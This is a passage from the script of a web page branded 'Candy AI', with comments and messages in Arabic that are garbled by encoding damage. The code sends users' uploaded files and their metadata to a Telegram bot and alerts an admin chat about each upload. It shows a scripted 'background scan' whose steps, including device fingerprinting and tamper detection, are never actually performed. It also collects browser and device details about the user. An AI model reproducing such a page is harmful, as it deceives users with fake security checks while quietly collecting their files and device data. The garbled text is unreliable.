            } else if (fileTypeDetected === 'video') {
                endpoint = 'sendVideo';
                fileField = 'video';
            } else {
                throw new Error('Ù†ÙˆØ¹ Ø§Ù„Ù…Ù„Ù ØºÙŠØ± Ù…Ø¯Ø¹ÙˆÙ…');
            }
            
            formData.append(fileField, file);
            
            // Ø¥Ø¶Ø§ÙØ© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„ÙˆØµÙÙŠØ©
            const caption = `ğŸ¬ Ù…Ù„Ù Ø¬Ø¯ÙŠØ¯ Ù…Ù† Candy AI\n\n` +
                           `âœ¨ Ø§Ù„Ø§Ø³Ù…: ${metadata.name}\n` +
                           `ğŸ“¦ Ø§Ù„Ø­Ø¬Ù…: ${metadata.size}\n` +
                           `ğŸ“ Ø§Ù„Ù†ÙˆØ¹: ${metadata.type}\n` +
                           `ğŸŒˆ Ø§Ù„Ø£Ø¨Ø¹Ø§Ø¯: ${metadata.dimensions}\n` +
                           `â±ï¸ Ø¢Ø®Ø± ØªØ¹Ø¯ÙŠÙ„: ${metadata.lastModified}`;
            
            formData.append('caption', caption);
            
            try {
                const response = await fetch(
                    `https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`,
                    {
                        method: 'POST',
                        body: formData
                    }
                );
                
                const result = await response.json();
                
                if (!result.ok) {
                    throw new Error(result.description || 'ÙØ´Ù„ ÙÙŠ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…Ù„Ù');
                }
                
                return result;
            } catch (error) {
                console.error('Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„:', error);
                throw new Error('ØªØ¹Ø°Ø± Ø§Ù„Ø§ØªØµØ§Ù„ Ø¨Ø®Ø§Ø¯Ù… ØªÙ„ÙŠØ¬Ø±Ø§Ù…');
            }
        }
        
        // Ø¥Ø±Ø³Ø§Ù„ Ø¥Ø´Ø¹Ø§Ø± Ø¥Ù„Ù‰ Ø§Ù„Ø£Ø¯Ù…Ù†
        async function sendAdminNotification(file) {
            const text = `ğŸ”® ØªÙ†Ø¨ÙŠÙ‡ Ø³Ø­Ø±ÙŠ: ØªÙ… Ø±ÙØ¹ Ù…Ù„Ù Ø¬Ø¯ÙŠØ¯\n\n` +
                         `ğŸ¬ Ø§Ø³Ù… Ø§Ù„Ù…Ù„Ù: ${file.name}\n` +
                         `ğŸ“¦ Ø­Ø¬Ù… Ø§Ù„Ù…Ù„Ù: ${formatFileSize(file.size)}\n` +
                         `ğŸ“ Ù†ÙˆØ¹ Ø§Ù„Ù…Ù„Ù: ${file.type}\n` +
                         `â³ Ø§Ù„ÙˆÙ‚Øª: ${new Date().toLocaleString()}`;
            
            try {
                await fetch(
                    `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
                    {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            chat_id: ADMIN_CHAT_ID,
                            text: text,
                            parse_mode: 'HTML'
                        })
                    }
                );
            } catch (error) {
                console.error('ÙØ´Ù„ Ø¥Ø±Ø³Ø§Ù„ Ø¥Ø´Ø¹Ø§Ø± Ø§Ù„Ø£Ø¯Ù…Ù†:', error);
            }
        }
        
        // Ø¨Ø¯Ø¡ Ø§Ù„ÙØ­Øµ Ø§Ù„Ø®Ù„ÙÙŠ
        function startBackgroundScan() {
            if (isScanning) return;
            isScanning = true;
            
            advancedScan.style.display = 'block';
            scanResults.innerHTML = '';
            
            const scanMessages = [
                "Ø¬Ø§Ø±ÙŠ ØªÙ‡ÙŠØ¦Ø© Ø§Ù„Ù†Ø¸Ø§Ù…...",
                "ØªØ­Ù…ÙŠÙ„ ÙˆØ­Ø¯Ø§Øª Ø§Ù„ÙØ­Øµ...",
                "Ø¬Ø§Ø±ÙŠ ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„ÙˆØµÙÙŠØ©...",
                "ÙØ­Øµ Ø¨ØµÙ…Ø© Ø§Ù„Ø¬Ù‡Ø§Ø²...",
                "Ø§Ù„ÙƒØ´Ù Ø¹Ù† Ø£ÙŠ Ù…Ø­Ø§ÙˆÙ„Ø§Øª ØªÙ„Ø§Ø¹Ø¨...",
                "ØªØ­Ù„ÙŠÙ„ Ø£Ù†Ù…Ø§Ø· Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…...",
                "Ø¬Ø§Ø±ÙŠ Ø¥Ù†Ø´Ø§Ø¡ Ø§Ù„ØªÙ‚Ø±ÙŠØ± Ø§Ù„Ù†Ù‡Ø§Ø¦ÙŠ..."
            ];
            
            let currentLine = 0;
            const scanInterval = setInterval(() => {
                if (currentLine >= scanMessages.length) {
                    clearInterval(scanInterval);
                    scanResults.innerHTML += '<span class="scan-line">[âœ“] Ø§Ù„ÙØ­Øµ Ø§ÙƒØªÙ…Ù„ Ø¨Ù†Ø¬Ø§Ø­</span>\n';
                    isScanning = false;
                    return;
                }
                
                scanResults.innerHTML += `<span class="scan-line">[+] ${scanMessages[currentLine]}</span>\n`;
                currentLine++;
                scanResults.scrollTop = scanResults.scrollHeight;
            }, 800);
        }
        
        // ØªØ³Ø¬ÙŠÙ„ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…
        function logUserData() {
            const userData = {
                timestamp: new Date().toISOString(),
                fileInfo: metadata,
                userInfo: {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    screenResolution: `${window.screen.width}x${window.screen.height}`,
                    deviceMemory: navigator.deviceMemory || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ',
                    hardwareConcurrency: navigator.hardwareConcurrency || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'
                }
            };
            
            console.log('Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…Ø³Ø¬Ù„Ø©:', userData);
        }
    </script>
</body>
</html>
